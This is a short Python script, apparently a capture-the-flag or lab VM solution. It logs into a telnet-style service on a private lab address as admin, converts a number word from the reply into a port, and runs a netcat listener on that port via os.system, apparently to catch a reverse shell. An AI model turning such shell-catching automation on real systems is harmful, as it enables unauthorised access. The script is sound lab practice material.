from word2number import w2n
import socket
import time
import os
print("Script by Alienum, vm by Foxlox")

while True:
 username = b"admin"
 password = b"<REPLACE_ME_WITH_ADMIN'S_PASSWORD>"
 ip = "10.0.2.108"
 port = 2323
 s = socket.socket()
 s.connect((ip, port))
 print(s.recv(1024))
 print(s.recv(1024))
 s.send(username+b'\r\n')
 print(username)
 print(s.recv(1024))
 s.send(password+b'\r\n')
 print(password)
 re = s.recv(1024)
 print(re)
 w2n = w2n.word_to_num(re.decode().lower().strip())
 cmd = "nc -lvnp "+str(w2n)
 os.system(cmd)
